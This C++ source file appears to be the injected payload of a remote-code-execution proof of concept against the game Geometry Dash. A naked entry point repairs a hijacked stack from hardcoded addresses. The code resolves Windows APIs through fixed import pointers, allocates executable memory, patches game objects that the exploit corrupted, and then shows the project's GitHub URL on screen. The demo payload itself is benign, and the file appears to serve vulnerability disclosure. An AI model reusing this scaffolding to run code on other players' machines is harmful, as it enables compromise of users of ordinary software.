#include "lib.hpp"
#include "gd.hpp"

#if COMPILING
static_assert(sizeof(void*) == 4);
static_assert(sizeof(wchar_t) == 2);
#endif

void* operator new(size_t size) {
	return operator_new(size);
}

void* operator new[](size_t size) {
	return operator_new(size);
}

[[gnu::section(".pretext"), gnu::naked]]
extern "C" void _start() {
	asm volatile (
		"mov (0x62aeb5fc), %esp\n"
		"add $8, %esp\n"
		"pop %edi\npop %esi\npop %ebx\n"
		"lea 0x2c(%esp), %ebp\n"
		"jmp start"
	);
}

extern "C" void start() {
	const auto GetModuleHandleA = *reinterpret_cast<void*(__stdcall**)(const char*)>(0x62abe020);
	const auto GetProcAddress = *reinterpret_cast<void*(__stdcall**)(void*, const char*)>(0x62abe01c);
	
	const auto gd = reinterpret_cast<uintptr_t>(GetModuleHandleA(0));
	const auto cocos = GetModuleHandleA("libcocos2d");
	const auto kernel32 = GetModuleHandleA("kernel32");

	const auto operator_new = from<void*(__cdecl*)(size_t)>(gd + 0x2820a4);

	const auto VirtualAlloc = reinterpret_cast<void*(__stdcall*)(void*, size_t, uint32_t, uint32_t)>(GetProcAddress(kernel32, "VirtualAlloc"));
	void* globalsPtr = VirtualAlloc(0, sizeof(Globals), 0x3000, 0x40);
	// evil hack >:)
	*reinterpret_cast<void**>(&start) = globalsPtr;
	
	// initialize globals
	globals().gd = gd;
	DEFINE_FUNC(0x000, operator_new);
	DEFINE_FUNC(0x001, GetProcAddress(kernel32, "WriteConsoleA"));
	DEFINE_FUNC(0x002, GetModuleHandleA);
	DEFINE_FUNC(0x003, GetProcAddress(kernel32, "VirtualProtect"));
	DEFINE_FUNC(0x004, GetProcAddress(kernel32, "FreeConsole"));
	DEFINE_FUNC(0x005, GetProcAddress(GetModuleHandleA("msvcr120"), "sprintf"));

	DEFINE_FUNC(0x200, gd + 0x111890);

	DEFINE_FUNC(0x500, GetProcAddress(cocos, "?sharedDirector@CCDirector@cocos2d@@SAPAV12@XZ"));
	DEFINE_FUNC(0x501, GetProcAddress(cocos, "?create@CCScene@cocos2d@@SAPAV12@XZ"));
	DEFINE_FUNC(0x502, GetProcAddress(cocos, "??0CCLayer@cocos2d@@QAE@XZ"));
	DEFINE_FUNC(0x503, GetProcAddress(cocos, "?init@CCLayer@cocos2d@@UAE_NXZ"));
	DEFINE_FUNC(0x504, GetProcAddress(cocos, "?autorelease@CCObject@cocos2d@@QAEPAV12@XZ"));
	DEFINE_FUNC(0x505, GetProcAddress(cocos, "?replaceScene@CCDirector@cocos2d@@QAE_NPAVCCScene@2@@Z"));
	DEFINE_FUNC(0x506, GetProcAddress(cocos, "?create@CCLabelBMFont@cocos2d@@SAPAV12@PBD0@Z"));
	DEFINE_FUNC(0x507, GetProcAddress(cocos, "?addChild@CCNode@cocos2d@@UAEXPAV12@@Z"));
	DEFINE_FUNC(0x508, GetProcAddress(cocos, "?scheduleUpdateForTarget@CCScheduler@cocos2d@@QAEXPAVCCObject@2@H_N@Z"));
	DEFINE_FUNC(0x509, GetProcAddress(cocos, "?unscheduleUpdateForTarget@CCScheduler@cocos2d@@QAEXPBVCCObject@2@@Z"));
	DEFINE_FUNC(0x50A, GetProcAddress(cocos, "?setRotation@CCNode@cocos2d@@UAEXM@Z"));
	DEFINE_FUNC(0x50B, GetProcAddress(cocos, "?getWinSize@CCDirector@cocos2d@@QAE?AVCCSize@2@XZ"));
	reinterpret_cast<int(__stdcall*)()>(GetProcAddress(kernel32, "AllocConsole"))();

	globals().stdout = reinterpret_cast<void*(__stdcall*)(int)>(GetProcAddress(kernel32, "GetStdHandle"))(-11);

	print("https://github.com/meltah/gd-rce :)\n");

	auto* gm = from<GameManager*>(gd, 0x3222d0);
	// fix up things we broke
	// GJEffectManager vtable
	gm->m_playLayer->m_effectManager->vtable = (void**) (gd + 0x2A5FC4);
	// GJEffectManager lua id (otherwise segfaults)
	gm->m_playLayer->m_effectManager->m_nLuaID = 0;
	// PlayLayer pointer
	*(char*) gm->m_playLayer -= (char) (int) gm->m_playLayer;

	// PlayLayer::onQuit
	reinterpret_cast<void(__thiscall*)(PlayLayer*)>(gd + 0x20d810)(gm->m_playLayer);

	auto* director = CCDirector_sharedDirector();
	auto* scene = CCScene_create();
	CCDirector_replaceScene(director, scene);
	auto* label = CCLabelBMFont_create("github.com/meltah/gd-rce", "bigFont.fnt");
	auto size = CCDirector_getWinSize(director);
	label->m_obPosition = { size.width / 2, size.height / 2 };
	label->m_bTransformDirty = true;
	label->m_bInverseDirty = true;
	CCNode_addChild(scene, label);
}

Globals& globals() {
	return **reinterpret_cast<Globals**>(&start);
}
